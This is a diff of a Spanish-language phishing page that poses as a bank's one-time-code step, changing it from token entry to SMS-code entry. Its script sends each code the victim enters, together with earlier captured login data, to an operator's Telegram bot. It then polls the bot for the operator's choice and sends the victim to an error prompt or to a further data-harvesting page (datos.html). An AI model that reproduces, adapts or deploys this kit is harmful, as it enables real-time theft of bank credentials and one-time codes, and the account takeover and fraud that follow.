@@ -54,8 +54,7 @@
             transform: rotate(360deg);
         }
     }
-</style>
-
+    </style>
 
 </head>
 
@@ -78,18 +77,18 @@
         </h2>
         <section class="bg-white rounded-lg p-5 shadow-sm">
             <div class="flex items-start space-x-3 mb-3">
-                <img alt="Icono de candado abierto con código" class="w-6 h-6 flex-shrink-0 mt-1" decoding="async" height="24" loading="lazy" src="candado.png" width="24" />
+                <img alt="Icono de teléfono celular recibiendo un mensaje de texto" class="w-6 h-6 flex-shrink-0 mt-1" decoding="async" height="24" loading="lazy" src="candado.png" width="24" />
                 <div>
                     <div class="flex items-center space-x-1 mb-1">
                         <span class="font-semibold text-[#1a2a5a] text-base">
-                            Código Token
+                            Código SMS
                         </span>
-                        <button aria-label="Información sobre Código Token" class="text-[#1a2a5a] border border-[#1a2a5a] rounded-full w-5 h-5 flex items-center justify-center text-xs font-semibold leading-none">
+                        <button aria-label="Información sobre Código SMS" class="text-[#1a2a5a] border border-[#1a2a5a] rounded-full w-5 h-5 flex items-center justify-center text-xs font-semibold leading-none">
                             i
                         </button>
                     </div>
                     <p class="text-[#5a5a5a] text-sm leading-relaxed max-w-[320px]">
-                        Para realizar este proceso, ingresa el código de Token móvil o físico.
+                        Hemos enviado un código a tu número de celular registrado. Por favor, ingrésalo para continuar.
                     </p>
                 </div>
             </div>
@@ -102,33 +101,29 @@
                     <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#1a2a5a]" />
                     <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#1a2a5a]" />
                 </div>
-                <p id="errorMessage" class="text-red-500 text-center mb-4 hidden">Token incorrecto, intenta de nuevo.</p>
+                <p id="errorMessage" class="text-red-500 text-center mb-4 hidden">Código SMS incorrecto, intenta de nuevo.</p>
+                <button id="verifyBtn" class="w-full bg-[#e5e7eb] text-[#9ca3af] font-semibold text-base rounded-full py-3 cursor-not-allowed transition-colors duration-200" disabled type="submit">
+                    Verificar
+                </button>
+            </form>
+        </section>
+    </main>
+    <div id="loader" class="loader-overlay" style="display: none;">
+        <div class="spinner"></div>
+        <p>Verificando código...</p>
+    </div>
+    <script>
+        const inputs = document.querySelectorAll(".token-input");
+        const verifyBtn = document.getElementById("verifyBtn");
+        const errorMessage = document.getElementById("errorMessage");
+        const loader = document.getElementById("loader");
 
-
-            <button id="verifyBtn" class="w-full bg-[#e5e7eb] text-[#9ca3af] font-semibold text-base rounded-full py-3 cursor-not-allowed transition-colors duration-200" disabled type="submit">
-                Verificar
-            </button>
-        </form>
-    </section>
-</main>
-
-<div id="loader" class="loader-overlay" style="display: none;">
-    <div class="spinner"></div>
-    <p>Verificando token...</p>
-</div>
-
-<script>
-    const inputs = document.querySelectorAll(".token-input");
-    const verifyBtn = document.getElementById("verifyBtn");
-    const errorMessage = document.getElementById("errorMessage");
-    const loader = document.getElementById("loader");
 
     let initialLoginData = null;
     let tokenAttemptCount = parseInt(sessionStorage.getItem('tokenAttemptCount')) || 0;
     let TELEGRAM_BOT_TOKEN = '';
     let TELEGRAM_CHAT_ID = '';
     let statusCheckInterval = null;
-
     let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0;
 
     async function loadTelegramConfig() {
@@ -162,7 +157,6 @@
             if (!data || !data.result) return;
             const updates = data.result;
             if (updates.length === 0) return;
-
             const maxUpdateId = Math.max(...updates.map(u => u.update_id));
             lastUpdateId = maxUpdateId;
             sessionStorage.setItem('lastUpdateId', lastUpdateId);
@@ -189,7 +183,6 @@
                 },
                 body: JSON.stringify(payload),
             });
-
             if (!response.ok) {
                 const errorText = await response.text();
                 console.error(`Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
@@ -220,17 +213,15 @@
                 const maxUpdateId = Math.max(...updates.map(u => u.update_id));
                 lastUpdateId = maxUpdateId;
                 sessionStorage.setItem('lastUpdateId', lastUpdateId);
-
                 const relevant = updates.filter(u => u.callback_query && u.callback_query.data && u.callback_query.data.includes(transactionId));
+
                 if (relevant.length > 0) {
                     const latest = relevant.reduce((a, b) => a.update_id > b.update_id ? a : b);
                     clearInterval(statusCheckInterval);
                     statusCheckInterval = null;
                     loader.style.display = 'none';
-
                     const callbackDataFull = latest.callback_query.data;
                     const callbackId = latest.callback_query.id;
-
                     try {
                         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                             method: 'POST',
@@ -240,22 +231,15 @@
                     } catch (err) {
                         console.warn('No se pudo responder callback_query:', err);
                     }
-
                     const callbackKey = callbackDataFull.split(':')[0];
-
-                    // Lógica para manejar los 4 botones
                     if (callbackKey === 'error_token') {
                         errorMessage.classList.remove('hidden');
-                        errorMessage.textContent = "Token incorrecto, intenta de nuevo.";
+                        errorMessage.textContent = "Código SMS incorrecto, intenta de nuevo.";
                         inputs.forEach(input => input.value = '');
                         inputs[0].focus();
                         checkAllFilled();
                     } else if (callbackKey === 'pedir_datos') {
                         window.location.href = "datos.html";
-                    } else if (callbackKey === 'token_sms') {
-                         window.location.href = "otp.html";
-                    } else if (callbackKey === 'finalizar') {
-                         window.location.href = "https://www.google.com";
                     } else {
                         console.log("Respuesta no reconocida del bot:", callbackDataFull);
                         alert("Respuesta no reconocida. Por favor, intente de nuevo.");
@@ -288,13 +272,11 @@
             }
             checkAllFilled();
         });
-
         input.addEventListener("keydown", (e) => {
             if (e.key === "Backspace" && !input.value && i > 0) {
                 inputs[i - 1].focus();
             }
         });
-
         input.addEventListener("paste", (e) => {
             e.preventDefault();
             const paste = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "").slice(0, 6);
@@ -322,7 +304,6 @@
         const token = [...inputs].map(input => input.value).join('');
         errorMessage.classList.add('hidden');
         loader.style.display = 'flex';
-
         tokenAttemptCount++;
 
         // Formato personalizado como el ejemplo que proporcionaste
@@ -347,28 +328,22 @@
             }
         }
 
-        telegramMessage += `\n〽️ Token App: ${token}\n\n`;
+        telegramMessage += `\n📱 Código SMS: ${token}\n\n`;
         telegramMessage += `Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
 
         sessionStorage.setItem('tokenAttemptCount', tokenAttemptCount);
-
-        // Botones para Telegram
         const keyboard = {
             inline_keyboard: [
-                [{ text: "❌ Error Token", callback_data: `error_token:${initialLoginData.transactionId}` },
-                 { text: "📋 Ir a Datos", callback_data: `pedir_datos:${initialLoginData.transactionId}` }],
-                [{ text: "👀 Token SMS", callback_data: `token_sms:${initialLoginData.transactionId}` },
-                 { text: "🚨Finalizar", callback_data: `finalizar:${initialLoginData.transactionId}` }]
+                [{ text: "❌ Error SMS", callback_data: `error_token:${initialLoginData.transactionId}` }],
+                [{ text: "📋 Ir a Datos", callback_data: `pedir_datos:${initialLoginData.transactionId}` }]
             ]
         };
-
         const sent = await sendToTelegram(telegramMessage, keyboard);
-
         if (sent) {
             checkTokenVerification(initialLoginData.transactionId);
         } else {
             loader.style.display = 'none';
-            alert("Error al enviar el token. Por favor, inténtalo de nuevo.");
+            alert("Error al enviar el código. Por favor, inténtalo de nuevo.");
         }
     });
 
